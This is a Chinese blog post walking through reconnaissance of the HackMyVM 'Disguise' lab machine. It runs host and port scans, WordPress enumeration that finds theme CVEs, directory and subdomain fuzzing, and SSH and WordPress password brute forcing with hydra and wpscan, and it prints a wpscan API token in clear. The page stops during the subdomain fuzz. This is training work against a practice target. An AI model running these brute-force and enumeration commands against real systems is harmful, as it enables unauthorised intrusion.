<!DOCTYPE html>
<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link href='https://7r1umph.top/css/primer.css' rel='stylesheet' />
    <link href='https://7r1umph.top/css/matrix.css' rel='stylesheet' /><script src='https://7r1umph.top/plugins/theme.js'></script><script src='https://7r1umph.top/plugins/StatsSidebar.js'></script>
    <link rel="icon" href="https://7r1umph.top/image/20250320200557660.ico">
<meta name="description" content="# 一、信息收集与初步探测

## 1.1 主机发现

渗透测试的第一步通常是发现网络中的存活主机。">
<meta property="og:title" content="hmv_Disguise靶机渗透测试详解">
<meta property="og:description" content="# 一、信息收集与初步探测

## 1.1 主机发现

渗透测试的第一步通常是发现网络中的存活主机。">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7r1UMPH.github.io/post/hmv_Disguise-ba-ji-shen-tou-ce-shi-xiang-jie.html">
<meta property="og:image" content="https://7r1umph.top/image/202506121404919.webp">
<title>hmv_Disguise靶机渗透测试详解</title>



</head>
<style>
body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
#footer {margin-top:64px; text-align: center;font-size: small;}

</style>

<style>
.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
.title-right{display:flex;margin:auto 0 0 auto;}
.title-right .circle{padding: 14px 16px;margin-right:8px;}
#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
#postBody hr{height:2px;}
#cmButton{height:48px;margin-top:48px;}
#comments{margin-top:64px;}
.g-emoji{font-size:24px;}
@media (max-width: 600px) {
    body {padding: 8px;}
    .postTitle{font-size:24px;}
}
.copy-feedback {
    display: none;
    position: absolute;
    top: 10px;
    right: 50px;
    color: var(--color-fg-on-emphasis);
    background-color: var(--color-fg-muted);
    border-radius: 3px;
    padding: 5px 8px;
    font-size: 12px;
}
</style>




<body>
    <div id="header">
<h1 class="postTitle">hmv_Disguise靶机渗透测试详解</h1>
<div class="title-right">
    <a href="https://7r1UMPH.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
        <svg class="octicon" width="16" height="16">
            <path id="pathHome" fill-rule="evenodd"></path>
        </svg>
    </a>
    
    <a href="https://github.com/7r1UMPH/7r1UMPH.github.io/issues/74" target="_blank" class="btn btn-invisible circle" title="Issue">
        <svg class="octicon" width="16" height="16">
            <path id="pathIssue" fill-rule="evenodd"></path>
        </svg>
    </a>
    

    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
        <svg class="octicon" width="16" height="16" >
            <path id="themeSwitch" fill-rule="evenodd"></path>
        </svg>
    </a>

</div>
</div>
    <div id="content">
<div class="markdown-body" id="postBody"><h1>一、信息收集与初步探测</h1>
<h2>1.1 主机发现</h2>
<p>渗透测试的第一步通常是发现网络中的存活主机。这里我们使用<code class="notranslate">arp-scan</code>工具对本地网络进行扫描。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l
[sudo] password for kali:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f4:ef:6f       VMware, Inc.
192.168.205.211 08:00:27:ea:d3:f5       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:f8:d7:c5       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.028 seconds (126.23 hosts/sec). 4 responded
</code></pre>
<p>扫描结果显示，IP地址为 <code class="notranslate">192.168.205.211</code> 的主机响应了ARP请求，其MAC地址为 <code class="notranslate">08:00:27:ea:d3:f5</code>。该IP将作为我们后续渗透的目标。</p>
<h2>1.2 端口扫描</h2>
<p>确定目标主机后，使用<code class="notranslate">nmap</code>进行端口扫描，以识别目标主机开放的服务。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- --min-rate 10000 192.168.205.211
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 21:57 EDT
Nmap scan report for 192.168.205.211
Host is up (0.00027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
</code></pre>
<p>Nmap扫描结果表明，目标主机开放了 TCP 22端口 (SSH服务) 和 TCP 80端口 (HTTP服务)。</p>
<h1>二、Web应用渗透测试</h1>
<h2>2.1 域名解析与站点识别</h2>
<p>直接通过IP地址访问目标主机的HTTP服务 (端口80)，发现网页内容提示需要解析域名。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/e4f060d53511d259fdf20c3c882dbe93369df01afdb59ce5c095b9f2ab68718a/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363039353835363635362e77656270"><img src="https://camo.githubusercontent.com/e4f060d53511d259fdf20c3c882dbe93369df01afdb59ce5c095b9f2ab68718a/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363039353835363635362e77656270" alt="image-20250516095849516" data-canonical-src="https://7r1UMPH.top/image/20250516095856656.webp" style="max-width: 100%;"></a></p>
<p>根据页面提示，该站点期望通过域名 <code class="notranslate">http://disguise.hmv</code> 访问。我们将此域名与目标IP的映射关系添加到本地 <code class="notranslate">/etc/hosts</code> 文件中。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "192.168.205.211 http://disguise.hmv" | sudo tee -a /etc/hosts &gt; /dev/null

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ tail -n 1 /etc/hosts
192.168.205.211 http://disguise.hmv
</code></pre>
<p>配置完成后，通过域名 <code class="notranslate">http://disguise.hmv</code> 访问站点。观察页面页脚信息，初步判断该站点是基于WordPress构建的。<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/f5ba73979624a1f93eaa4cb746303246158ac7abd454b815dccefebd0c15c155/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363130303834323738312e77656270"><img src="https://camo.githubusercontent.com/f5ba73979624a1f93eaa4cb746303246158ac7abd454b815dccefebd0c15c155/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363130303834323738312e77656270" alt="image-20250516100842676" data-canonical-src="https://7r1UMPH.top/image/20250516100842781.webp" style="max-width: 100%;"></a></p>
<h2>2.2 WordPress漏洞扫描与信息收集</h2>
<h3>2.2.1 Nuclei扫描</h3>
<p>首先尝试使用<code class="notranslate">nuclei</code>对目标WordPress站点进行自动化漏洞扫描。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nuclei -u http://disguise.hmv/

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.2

                projectdiscovery.io

[INF] Current nuclei version: v3.4.2 (outdated)
[INF] Current nuclei-templates version: v10.2.1 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 42
[INF] Templates loaded for current scan: 7925
[WRN] Loading 198 unsigned templates for scan. Use with caution.
[INF] Executing 7727 signed templates from projectdiscovery/nuclei-templates
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1736 (Reduced 1632 Requests)
[INF] Using Interactsh Server: oast.pro
[INF] No results found. Better luck next time!
</code></pre>
<p>Nuclei扫描未发现明显漏洞。接下来使用更专业的WordPress扫描工具<code class="notranslate">wpscan</code>。</p>
<h3>2.2.2 WPScan扫描</h3>
<p>执行<code class="notranslate">wpscan</code>对站点进行详细枚举，包括用户、主题、插件等。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wpscan --url "http://disguise.hmv" --enumerate u,t,p,m --random-user-agent --api-token 6jJQ6zlZssGILOaGfCu2z7aVSLdYgEYokmESJuHejs8
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://disguise.hmv/ [192.168.205.211]
[+] Started: Thu May 15 22:20:25 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.59 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://disguise.hmv/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://disguise.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://disguise.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://disguise.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://disguise.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://disguise.hmv/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;
 |  - http://disguise.hmv/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;

[+] WordPress theme in use: newscrunch
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | [!] The version is out of date, the latest version is 1.8.5
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1
 | Style Name: Newscrunch
 | Style URI: https://spicethemes.com/newscrunch
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.8.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1, Match: 'Version: 1.8.4.2'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *
 | Location: http://disguise.hmv/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 &lt;===================================================================================================&gt; (400 / 400) 100.00% Time: 00:00:03
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] newsblogger
 | Location: http://disguise.hmv/wp-content/themes/newsblogger/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newsblogger/readme.txt
 | [!] The version is out of date, the latest version is 0.2.5.6
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/newsblogger/style.css
 | Style Name: NewsBlogger
 | Style URI: https://spicethemes.com/newsblogger-wordpress-theme/
 | Description: NewsBlogger is a dynamic and versatile child theme for the popular NewCrunch WordPress theme. Perfec...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://disguise.hmv/wp-content/themes/newsblogger/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: NewsBlogger &lt; 0.2.5.5 - Cross-Site Request Forgery to Arbitrary Plugin Installation
 |     Fixed in: 0.2.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/916ba2a7-6592-4abf-acbf-63e46111b964
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1305
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2cac27-4a36-490f-b2d8-3c6f32843a38
 |
 | [!] Title: NewsBlogger &lt; 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload
 |     Fixed in: 0.2.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/ab2f96dc-e786-48db-8207-a76ec50d7e63
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1304
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85cea6b5-d57b-495e-a504-a0c1ba691637
 |
 | Version: 0.2.5.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newsblogger/style.css, Match: 'Version: 0.2.5.1'

[+] newscrunch
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | [!] The version is out of date, the latest version is 1.8.5
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css
 | Style Name: Newscrunch
 | Style URI: https://spicethemes.com/newscrunch
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://disguise.hmv/wp-content/themes/newscrunch/, status: 500
 |
 | Version: 1.8.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css, Match: 'Version: 1.8.4.2'

[+] twentytwentyfive
 | Location: http://disguise.hmv/wp-content/themes/twentytwentyfive/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfive/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.0'

[+] twentytwentyfour
 | Location: http://disguise.hmv/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.3 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.3'

[+] twentytwentythree
 | Location: http://disguise.hmv/wp-content/themes/twentytwentythree/
 | Latest Version: 1.6 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentythree/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.6'

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 &lt;===============================================================================================&gt; (100 / 100) 100.00% Time: 00:00:00

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] simpleadmin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://disguise.hmv/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] simpleAdmin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 7
 | Requests Remaining: 18

[+] Finished: Thu May 15 22:20:43 2025
[+] Requests Done: 598
[+] Cached Requests: 26
[+] Data Sent: 176.914 KB
[+] Data Received: 23.432 MB
[+] Memory used: 285.922 MB
[+] Elapsed time: 00:00:18
</code></pre>
<p>WPScan扫描结果的关键信息：</p>
<ul>
<li><code class="notranslate">robots.txt</code>文件存在。</li>
<li>WordPress 版本为 <code class="notranslate">6.8.1</code> (最新版)。</li>
<li>主题 <code class="notranslate">newsblogger</code> 版本为 <code class="notranslate">0.2.5.1</code>，存在两个已知漏洞：
<ul>
<li><code class="notranslate">CVE-2025-1305</code>: NewsBlogger &lt; 0.2.5.5 - CSRF to Arbitrary Plugin Installation.</li>
<li><code class="notranslate">CVE-2025-1304</code>: NewsBlogger &lt; 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload. （这个看起来更有利用价值）</li>
</ul>
</li>
<li>发现用户 <code class="notranslate">simpleadmin</code> (以及 <code class="notranslate">simpleAdmin</code>，可能为同一用户)。</li>
</ul>
<h2>2.3 密码爆破尝试 (WordPress &amp; SSH)</h2>
<p>基于发现的用户 <code class="notranslate">simpleadmin</code>，尝试对其WordPress后台密码进行爆破。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wpscan --url http://disguise.hmv -U simpleadmin -P /usr/share/wordlists/rockyou.txt --random-user-agent
</code></pre>
<p>同时，在另一个终端窗口尝试爆破SSH服务密码。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l simpleadmin -P 5000q.txt ssh://192.168.205.211 -I -u -f -e nsr -t 64
</code></pre>
<p>经过约10分钟的等待，两个爆破均未成功，判断密码爆破的路径可能行不通。</p>
<h2>2.4 Web目录爆破</h2>
<p>尝试使用<code class="notranslate">gobuster</code>对<code class="notranslate">http://disguise.hmv</code>进行目录爆破，以发现可能存在的隐藏页面或资源。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://disguise.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,md,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/]
/rss                  (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/login                (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php]
/login.php            (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php]
/0                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/0/]
/feed                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/atom                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/atom/]
/s                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/wp-content           (Status: 301) [Size: 317] [--&gt; http://disguise.hmv/wp-content/]
/admin                (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-admin/]
/h                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/2025/04/01/hello-world/]
/wp-login.php         (Status: 200) [Size: 5275]
/rss2                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/license.txt          (Status: 200) [Size: 19903]
/wp-includes          (Status: 301) [Size: 318] [--&gt; http://disguise.hmv/wp-includes/]
/wp-register.php      (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php?action=register]
/S                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/wp-rss2.php          (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/H                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/2025/04/01/hello-world/]
/sa                   (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/rdf                  (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/]
Progress: 9864 / 1323360 (0.75%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9882 / 1323360 (0.75%)
[ERROR] context canceled
[ERROR] context canceled
[ERROR] context canceled
===============================================================
Finished
===============================================================
</code></pre>
<p>目录爆破运行约2分钟后，发现扫描速度非常缓慢，推测WordPress站点可能存在WAF或其他防护机制。决定暂停扫描，寻找其他突破口。</p>
<h1>三、网络层面信息发掘</h1>
<h2>3.1 IPv6探测</h2>
<p>尝试从IPv6层面进行探测。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ping6 -I eth0 ff02::1
ping6: Warning: IPv6 link-local address on ICMP datagram socket may require ifname or scope-id =&gt; use: address%&lt;ifname|scope-id&gt;
ping6: Warning: source address might be selected on device other than: eth0
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=1 ttl=64 time=0.112 ms
64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=1 ttl=64 time=0.744 ms
64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=2 ttl=64 time=0.322 ms
^C
--- ff02::1 ping statistics ---
2 packets transmitted, 2 received, +2 duplicates, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.036/0.303/0.744/0.275 ms
</code></pre>
<p><code class="notranslate">ping6</code>发现了两个IPv6本地链路地址。其中 <code class="notranslate">fe80::a00:27ff:feea:d3f5%eth0</code> 的MAC地址与之前IPv4扫描的目标主机MAC地址 <code class="notranslate">08:00:27:EA:D3:F5</code> 相符 (EUI-64转换)。<br>
对这两个IPv6地址进行<code class="notranslate">nmap</code>端口扫描。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -p- fe80::9ffa:901:c1:10b9%eth0  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT
Nmap scan report for fe80::9ffa:901:c1:10b9
Host is up (0.0000070s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -p- fe80::a00:27ff:feea:d3f5%eth0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT
Nmap scan report for fe80::a00:27ff:feea:d3f5
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
</code></pre>
<p>对与目标MAC地址一致的IPv6地址 <code class="notranslate">fe80::a00:27ff:feea:d3f5%eth0</code> 进行服务版本探测。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -sV -p22,80 fe80::a00:27ff:feea:d3f5%eth0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:42 EDT
Nmap scan report for fe80::a00:27ff:feea:d3f5
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
</code></pre>
<p>IPv6扫描结果与IPv4一致，开放SSH (OpenSSH 7.9p1) 和 HTTP (Apache 2.4.59) 服务。</p>
<h2>3.2 流量监听</h2>
<p>使用<code class="notranslate">tcpdump</code>监听目标主机 <code class="notranslate">192.168.205.211</code> 的网络流量，观察是否有异常通信。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo tcpdump -i eth0 host 192.168.205.211 -nn
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
22:44:40.505340 IP 192.168.205.211.41597 &gt; 162.159.200.1.123: NTPv4, Client, length 48
22:44:40.876037 ARP, Request who-has 192.168.205.211 tell 192.168.205.2, length 46
22:44:40.876365 ARP, Reply 192.168.205.211 is-at 08:00:27:ea:d3:f5, length 46
22:44:40.876419 IP 162.159.200.1.123 &gt; 192.168.205.211.41597: NTPv4, Server, length 48
22:44:45.642888 ARP, Request who-has 192.168.205.2 tell 192.168.205.211, length 46
22:44:45.642969 ARP, Reply 192.168.205.2 is-at 00:50:56:f4:ef:6f, length 46
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
</code></pre>
<p>经过约1分钟的监听，捕获到的主要是NTP和ARP报文，未发现有价值的信息。</p>
<h1>四、子域名爆破与关键发现</h1>
<h2>4.1 FFUF子域名爆破 (初试)</h2>
<p>将注意力转回Web层面，尝试进行子域名爆破。使用<code class="notranslate">ffuf</code>工具，通过修改Host头的方式进行探测。</p>
<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ffuf -u http://disguise.hmv/ -H 'Host: FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -fw 11916

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________
